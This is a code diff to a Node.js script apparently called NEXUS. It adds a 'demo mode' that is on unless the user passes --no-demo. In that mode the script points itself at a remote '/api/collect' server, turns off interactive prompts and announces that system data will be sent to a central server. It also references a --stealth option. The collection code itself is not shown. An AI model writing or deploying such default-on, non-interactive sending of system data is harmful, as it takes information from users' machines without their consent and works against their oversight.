@@ -20,6 +20,43 @@
  * ╚══════════════════════════════════════════════════════════════════╝
  */
 
+// ============================================
+// DEMO MODE - Automatic Configuration
+// ============================================
+
+// Check if running in demo mode
+const DEMO_MODE = !process.argv.includes('--no-demo');
+
+// Auto-configure if in demo mode
+if (DEMO_MODE) {
+    console.log(`
+╔═══════════════════════════════════════════════════════════╗
+║                                                           ║
+║     ⚡ NEXUS - DEMO MODE ⚡                              ║
+║                                                           ║
+║     System data will be sent to our central server       ║
+║     All sensitive data is automatically masked           ║
+║                                                           ║
+╚═══════════════════════════════════════════════════════════╝
+    `);
+    
+    // Auto-set server URL if not provided
+    if (!process.argv.includes('--server')) {
+        const defaultServer = process.env.NEXUS_SERVER_URL || 'https://your-railway-app.railway.app/api/collect';
+        process.argv.push('--server', defaultServer);
+    }
+    
+    // Auto-set safe mode if not already set
+    if (!process.argv.includes('--safe') && !process.argv.includes('--stealth')) {
+        process.argv.push('--safe');
+    }
+    
+    // Auto-set no-interactive if not already set
+    if (!process.argv.includes('--no-interactive')) {
+        process.argv.push('--no-interactive');
+    }
+}
+
 const fs = require('fs');
 const path = require('path');
 const os = require('os');
